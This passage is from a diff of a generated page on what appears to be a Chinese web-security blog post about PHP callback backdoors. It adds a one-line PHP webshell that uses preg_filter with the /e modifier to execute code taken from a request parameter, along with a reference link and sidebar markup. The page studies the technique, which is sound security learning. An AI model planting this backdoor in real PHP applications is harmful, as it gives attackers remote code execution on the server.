+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">&#x27;|.*|e&#x27;</span>, $_REQUEST[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="Reference">Reference</h2>
+<p><a target="_blank" rel="noopener" href="https://leavesongs.com/PENETRATION/php-callback-backdoor.html">创造tips的秘籍——PHP回调后门</a></p>
 
 </div>
 
@@ -545,12 +435,23 @@ function sidebar_toggle() {
     <!-- Author title
     <div class="author-title">
       <div>ca01h</div>
-      <div>2020-09-26</div>
+      <div>2019-12-03</div>
     </div> -->
 	
 	<script src="https://www.hackthebox.eu/badge/212159"></script>
   </div> 
 
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>-><a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" rel="tag">#web安全基础</a> <a class="tag-none-link" href="/tags/%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8/" rel="tag">#回调后门</a>
+    </div>
+    
   
 
   <div class="divider"></div>
